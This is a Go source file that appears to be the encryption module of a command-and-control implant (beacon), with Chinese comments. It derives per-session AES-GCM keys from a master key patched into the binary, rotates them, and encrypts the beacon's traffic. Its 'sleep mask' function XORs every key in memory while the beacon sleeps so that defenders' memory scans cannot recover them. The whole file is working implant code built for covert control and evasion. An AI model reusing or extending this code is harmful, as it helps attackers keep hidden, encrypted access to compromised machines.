package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/hkdf"
	"implant/core/config"
	"implant/core/debuglog"
)

// sessionKeyInfo HKDF 会话密钥派生盐上下文(固定,与服务端 pkg/encrypt/encrypt.go 完全一致;不得用随机 masquerade 前缀)
// 会话密钥派生盐上下文来自配置占位符(服务端 security.session_key_info patch,两端一致)

// masterKey 监听器主密钥（由 SetSessionKey 注入；用于 MetaInfo 等 FirstBlood 前传输的 AES-GCM 加密）。
// 【加密体系改造】旧加密（AES-CFB 密钥前置明文）已移除——截获即解密；统一 AES-GCM。
var globalMasterKey []byte

// globalSalt 监听器加密盐（SetSessionKey 注入；会话密钥唯一化重派生用）
var globalSalt []byte

// SetMasterKey 注入监听器主密钥（app.Init 时调用；MetaInfo 等 FirstBlood 前传输的 AES-GCM 加密用）
func SetMasterKey(masterKey []byte) {
	if len(masterKey) >= 32 {
		mk := make([]byte, 32)
		copy(mk, masterKey[:32])
		globalMasterKey = mk
	}
}

// getMasterKey 返回监听器主密钥（未注入时返回 nil）
func getMasterKey() []byte { return globalMasterKey }

// EncryptWithMasterKey 用监听器主密钥 AES-GCM 加密（MetaInfo 传输等）。
// 格式: nonce(12) | GCM 密文。主密钥来自二进制 patch 的占位符，服务端持同一密钥。
func EncryptWithMasterKey(data []byte) ([]byte, error) {
	mk := getMasterKey()
	if len(mk) < 32 {
		return nil, errors.New("主密钥未初始化")
	}
	gcm, err := getAEAD(mk)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	out := gcm.Seal(nonce, nonce, data, nil)
	return out, nil
}

// DecryptWithMasterKey 用监听器主密钥 AES-GCM 解密（MetaInfo 传输等）
func DecryptWithMasterKey(data []byte) ([]byte, error) {
	mk := getMasterKey()
	if len(mk) < 32 {
		return nil, errors.New("主密钥未初始化")
	}
	gcm, err := getAEAD(mk)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, errors.New("密文过短")
	}
	nonce := data[:gcm.NonceSize()]
	ciphertext := data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// EncryptWithMasterKeyRaw 用指定主密钥加密（供服务端按监听器密钥解密；客户端一般用全局注入）
func EncryptWithMasterKeyRaw(data, masterKey []byte) ([]byte, error) {
	if len(masterKey) < 32 {
		return nil, errors.New("主密钥无效")
	}
	gcm, err := getAEAD(masterKey)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

// DecryptWithMasterKeyRaw 用指定主密钥解密
func DecryptWithMasterKeyRaw(data, masterKey []byte) ([]byte, error) {
	if len(masterKey) < 32 {
		return nil, errors.New("主密钥无效")
	}
	gcm, err := getAEAD(masterKey)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, errors.New("密文过短")
	}
	return gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
}

// EncodeBase64 将 []byte 编码为 Base64 并返回 []byte
func EncodeBase64(data []byte) ([]byte, error) {
	encodedString := base64.StdEncoding.EncodeToString(data)
	return []byte(encodedString), nil
}

// DecodeBase64 将 Base64 编码的 []byte 解码回原始的 []byte
func DecodeBase64(encodedData []byte) ([]byte, error) {
	decodedData, err := base64.StdEncoding.DecodeString(string(encodedData))
	if err != nil {
		return nil, err
	}
	return decodedData, nil
}

// ClientKeyManager 客户端密钥管理器
type ClientKeyManager struct {
	clientID    string
	sessionKey  []byte
	previousKey []byte // P3-1: 轮换前的旧密钥（重叠期内仍用于解密服务端轮换确认前的消息）
	keyVersion  int
	keyID       string
	createdAt   time.Time
	expiresAt   time.Time
	mu          sync.RWMutex

	// masked 为真时密钥材料处于遮蔽状态：此时取用密钥必须等待还原，
	// 否则会拿到被 XOR 过的字节去加密（服务端 GCM 认证必然失败）。
	masked   bool
	unmasked *sync.Cond // 还原时唤醒等待者
}

// GlobalClientKeyManager 全局客户端密钥管理器
var GlobalClientKeyManager *ClientKeyManager

// keyUsersInFlight 正在使用密钥的调用数（加解密进入 +1、返回 -1）。
//
// sleep mask 用它判断"此刻有没有人在用密钥"：隧道/交互会话的收发都经过
// Encrypt/Decrypt，只要有一个在途，遮蔽就会把它挡在门外（见 MaskForSleep）。
// 注意语义是"在途"而不是"用过"——后者会把 beacon 自己的心跳与命令回执也算进来，
// 结果是每一轮都判定为忙、遮蔽永不生效。
var keyUsersInFlight atomic.Int64

// KeyUsersInFlight 返回在途的密钥使用者数（sleep mask 判定用）
func KeyUsersInFlight() int64 { return keyUsersInFlight.Load() }

// enterKeyUse/exitKeyUse 标记一次密钥使用（供加解密路径与测试使用）
func enterKeyUse() { keyUsersInFlight.Add(1) }
func exitKeyUse()  { keyUsersInFlight.Add(-1) }

// InitClientKeyManager 初始化客户端密钥管理器
func InitClientKeyManager(clientID string) {
	ckm := &ClientKeyManager{clientID: clientID}
	ckm.unmasked = sync.NewCond(&ckm.mu)
	GlobalClientKeyManager = ckm
}

// SetSessionKey 设置会话密钥
func (ckm *ClientKeyManager) SetSessionKey(salt []byte, masterKey []byte) error {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	// 注入监听器主密钥与盐（MetaInfo 传输加密 + 会话密钥唯一化重派生用）
	if len(masterKey) >= 32 {
		mk := make([]byte, 32)
		copy(mk, masterKey[:32])
		globalMasterKey = mk
	}
	if len(salt) >= 16 {
		sl := make([]byte, 16)
		copy(sl, salt[:16])
		globalSalt = sl
	}

	// 使用 HKDF 派生会话密钥
	hkdf := hkdf.New(sha256.New, masterKey, salt, []byte(config.SessionKeyInfo()+ckm.clientID))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdf, sessionKey); err != nil {
		return fmt.Errorf("派生会话密钥失败: %v", err)
	}

	// 生成确定性密钥ID（与服务端保持一致）
	keyIDInput := ckm.clientID + "_session_" + string(salt)
	hasher := md5.New()
	hasher.Write([]byte(keyIDInput))
	keyIDBytes := hasher.Sum(nil)
	keyID := hex.EncodeToString(keyIDBytes[:8]) // 使用前8字节

	ckm.sessionKey = sessionKey
	ckm.keyVersion++
	ckm.keyID = keyID
	ckm.createdAt = time.Now()
	ckm.expiresAt = time.Now().Add(24 * time.Hour)

	debuglog.Printf("🔑 [CLIENT] 会话密钥设置成功: KeyID=%s, Version=%d\n", keyID, ckm.keyVersion)
	return nil
}

// SetSessionKeyWithNonce 会话密钥唯一化：用服务端下发的每连接随机 nonce 重派生会话密钥。
// 原实现同一监听器所有客户端共享同一把 HKDF 密钥；加入 nonce 后每会话唯一。
// 使用 SetSessionKey 缓存的 masterKey/salt。
// P3-1: 同时服务于密钥轮换（服务端下发 type=5|nonce，客户端以同一 nonce 重派生）；
// 旧密钥降为 previousKey（重叠期内仍可解密服务端轮换确认前用旧密钥加密的消息）。
func (ckm *ClientKeyManager) SetSessionKeyWithNonce(nonce []byte) error {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	if len(globalMasterKey) < 32 || len(globalSalt) < 16 {
		return errors.New("监听器主密钥/盐未初始化")
	}

	hk := hkdf.New(sha256.New, globalMasterKey, globalSalt, []byte(config.SessionKeyInfo()+ckm.clientID+string(nonce)))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hk, sessionKey); err != nil {
		return fmt.Errorf("派生会话密钥失败: %v", err)
	}

	// 旧密钥保留为 previousKey（轮换/唯一化后的重叠期解密）
	if ckm.sessionKey != nil {
		ckm.previousKey = append([]byte{}, ckm.sessionKey...)
	}
	ckm.sessionKey = sessionKey
	ckm.keyVersion++
	ckm.keyID = fmt.Sprintf("%s-n%d", ckm.keyID, ckm.keyVersion)
	ckm.createdAt = time.Now()
	ckm.expiresAt = time.Now().Add(24 * time.Hour)

	debuglog.Printf("🔑 [CLIENT] 会话密钥唯一化完成: KeyID=%s, Version=%d\n", ckm.keyID, ckm.keyVersion)
	return nil
}

// SetSessionKeyRotate 密钥轮换（P3-1）：用服务端下发的轮换 nonce 重派生，
// 与 SetSessionKeyWithNonce 同公式（服务端以同输入派生 NextKey）。轮换语义上
// 保持唯一化体系：每次轮换随机 nonce，密钥仍每会话唯一。
func (ckm *ClientKeyManager) SetSessionKeyRotate(nonce []byte) error {
	return ckm.SetSessionKeyWithNonce(nonce)
}

// GetSessionKey 获取会话密钥
func (ckm *ClientKeyManager) GetSessionKey() ([]byte, error) {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	// 遮蔽期间等待还原（sleep mask 只在 beacon 空闲时启动，正常情况下这里不会等）
	ckm.waitUnmaskedLocked()

	if ckm.sessionKey == nil {
		return nil, errors.New("会话密钥未初始化")
	}

	if time.Now().After(ckm.expiresAt) {
		return nil, errors.New("会话密钥已过期")
	}

	// 返回拷贝：调用方不得污染全局会话密钥（sleep mask 走 MaskForSleep 就地遮蔽真身）
	keyCopy := make([]byte, len(ckm.sessionKey))
	copy(keyCopy, ckm.sessionKey)
	return keyCopy, nil
}

// aeadCache 按密钥缓存 cipher.AEAD。aes.NewCipher（含 key schedule）+ cipher.NewGCM（含 GHASH
// 初始化）开销大，而会话密钥稳定，应复用。键为 key 字节序列的 string 视图。
var aeadCache sync.Map

// aeadCacheMaxEntries 缓存条目上限：会话密钥 24h 轮换/重连变体下，
// 无上限时长期运行内存缓慢增长；超过上限清空重建（重建代价为一次密钥调度）。
const aeadCacheMaxEntries = 16

// aeadCacheLen 统计缓存条目数（仅 miss 路径调用，频率低）
func aeadCacheLen() int {
	n := 0
	aeadCache.Range(func(_, _ interface{}) bool { n++; return true })
	return n
}

// getAEAD 取（必要时构建并缓存）指定密钥的 AES-GCM AEAD。
func getAEAD(key []byte) (cipher.AEAD, error) {
	k := string(key)
	if v, ok := aeadCache.Load(k); ok {
		return v.(cipher.AEAD), nil
	}
	// 【优化】超限清空，防止历史轮换密钥的 GCM 实例无界累积
	if aeadCacheLen() >= aeadCacheMaxEntries {
		aeadCache.Range(func(kk, _ interface{}) bool { aeadCache.Delete(kk); return true })
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("创建密码块失败: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建 GCM 失败: %v", err)
	}
	aeadCache.Store(k, gcm)
	return gcm, nil
}

// SecureEncrypt 使用 AES-GCM 进行安全加密
func SecureEncrypt(data []byte, key []byte) ([]byte, error) {
	gcm, err := getAEAD(key)
	if err != nil {
		return nil, err
	}

	// 生成随机 nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("生成 nonce 失败: %v", err)
	}

	// 加密数据
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// SecureDecrypt 使用 AES-GCM 进行安全解密
func SecureDecrypt(ciphertext []byte, key []byte) ([]byte, error) {
	gcm, err := getAEAD(key)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("密文太短")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// 解密数据
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("解密失败: %v", err)
	}

	return plaintext, nil
}

// EncryptWithSessionKey 使用会话密钥加密
func EncryptWithSessionKey(data []byte) ([]byte, error) {
	if GlobalClientKeyManager == nil {
		return nil, errors.New("客户端密钥管理器未初始化")
	}

	// 先标记"在途"再取密钥：遮蔽判定与在途计数在同一个锁下求值，
	// 否则会出现"遮蔽刚判定为空闲、这边紧接着开始用密钥"的窗口
	enterKeyUse()
	defer exitKeyUse()

	// 【加密体系改造】会话密钥缺失/加密失败直接报错，不再回落旧加密
	sessionKey, err := GlobalClientKeyManager.GetSessionKey()
	if err != nil {
		return nil, err
	}
	return SecureEncrypt(data, sessionKey)
}

// DecryptWithSessionKey 使用会话密钥解密（P3-1: 轮换重叠期先试当前密钥，
// 失败再试 previousKey——服务端确认轮换前仍用旧密钥加密命令）
func DecryptWithSessionKey(ciphertext []byte) ([]byte, error) {
	if GlobalClientKeyManager == nil {
		return nil, errors.New("客户端密钥管理器未初始化")
	}

	enterKeyUse()
	defer exitKeyUse()

	ckm := GlobalClientKeyManager
	ckm.mu.Lock()
	ckm.waitUnmaskedLocked()
	// 必须在锁内拷贝：直接把切片带出锁使用的话，遮蔽一旦发生在拷贝之后，
	// 解密用的就是被 XOR 过的字节（表现为服务端/客户端 GCM 认证失败，
	// 且只在"遮蔽窗口与解密撞车"时偶发）
	cur := append([]byte{}, ckm.sessionKey...)
	prev := append([]byte{}, ckm.previousKey...)
	ckm.mu.Unlock()

	if len(cur) == 0 {
		return nil, errors.New("会话密钥未初始化")
	}
	plaintext, err := SecureDecrypt(ciphertext, cur)
	if err == nil {
		return plaintext, nil
	}
	// 轮换重叠期：旧密钥仍可解密服务端在确认前下发的消息
	if len(prev) > 0 {
		return SecureDecrypt(ciphertext, prev)
	}
	return nil, err
}

// waitUnmaskedLocked 等待遮蔽还原（调用方须持有 ckm.mu 写锁）。
// 用 Cond 而不是短轮询：遮蔽窗口通常是整个睡眠周期（数秒到数十秒），
// 轮询既浪费 CPU 也会让等待方在还原后还要多等一个轮询周期。
func (ckm *ClientKeyManager) waitUnmaskedLocked() {
	for ckm.masked {
		ckm.unmasked.Wait()
	}
}

// MaskForSleep 在睡眠期间遮蔽全部密钥材料，返回还原函数。
//
// 为什么是"就地遮蔽真身"而不是"遮蔽副本"：原实现取 GetSessionKey()（返回拷贝）
// 再对拷贝做 XOR —— 真正的会话密钥在管理器里原样躺着，遮蔽的是一个谁也看不到的
// 局部变量。看似有 OPSEC，实际一点没保护。
//
// 遮蔽范围：会话密钥、上一把密钥（轮换重叠期）、主密钥与盐（HKDF 的根）、
// 以及 AEAD 缓存（它以密钥字节为 map key，不清等于又留了一份明文密钥）。
//
// 第二个返回值为 false 表示"当前不适合遮蔽"，调用方应只睡眠：此刻有在途的
// 密钥使用者（隧道/交互会话正在收发），遮蔽会把它们的下一次收发挡到睡眠结束。
func (ckm *ClientKeyManager) MaskForSleep() (func(), bool) {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	if ckm.masked || len(ckm.sessionKey) == 0 {
		return nil, false
	}
	if keyUsersInFlight.Load() > 0 {
		// 此刻有隧道/交互会话在收发：跳过本轮遮蔽，绝不打断活跃会话
		return nil, false
	}

	// 逐段就地 XOR：pad 随材料一同保存，还原后立刻擦除
	type seg struct {
		buf []byte
		pad []byte
	}
	segs := make([]seg, 0, 5)
	maskOne := func(buf []byte) bool {
		if len(buf) == 0 {
			return true
		}
		pad := make([]byte, len(buf))
		if _, err := rand.Read(pad); err != nil {
			return false
		}
		for i := range buf {
			buf[i] ^= pad[i]
		}
		segs = append(segs, seg{buf: buf, pad: pad})
		return true
	}

	ok := maskOne(ckm.sessionKey) && maskOne(ckm.previousKey) &&
		maskOne(globalMasterKey) && maskOne(globalSalt)
	if !ok {
		// 随机源失败：把已遮蔽的部分还原，不做半遮蔽（半遮蔽比不遮蔽更危险）
		for _, sg := range segs {
			for i := range sg.buf {
				sg.buf[i] ^= sg.pad[i]
			}
		}
		return nil, false
	}

	// 缓存以密钥为 map key：留着等于没遮蔽
	aeadCache.Range(func(k, _ interface{}) bool {
		aeadCache.Delete(k)
		return true
	})
	ckm.masked = true

	var once sync.Once
	return func() {
		once.Do(func() {
			ckm.mu.Lock()
			defer ckm.mu.Unlock()
			for _, sg := range segs {
				for i := range sg.buf {
					sg.buf[i] ^= sg.pad[i]
				}
				// 擦除 pad：还原之后它没有任何用途，留着只是多一份可被
				// "密文 XOR pad" 还原密钥的材料
				for i := range sg.pad {
					sg.pad[i] = 0
				}
			}
			ckm.masked = false
			ckm.unmasked.Broadcast()
		})
	}, true
}

// MaskedForTest 报告当前是否处于遮蔽状态（测试用）
func (ckm *ClientKeyManager) MaskedForTest() bool {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()
	return ckm.masked
}

// BytesToMD5 计算字节数组的 MD5 哈希值
func BytesToMD5(s []byte) string {
	// 创建一个新的 MD5 哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write(s)

	// 获取哈希值的字节切片
	md5Bytes := hasher.Sum(nil)

	// 将字节切片转换为十六进制字符串
	return fmt.Sprintf("%x", md5Bytes)
}
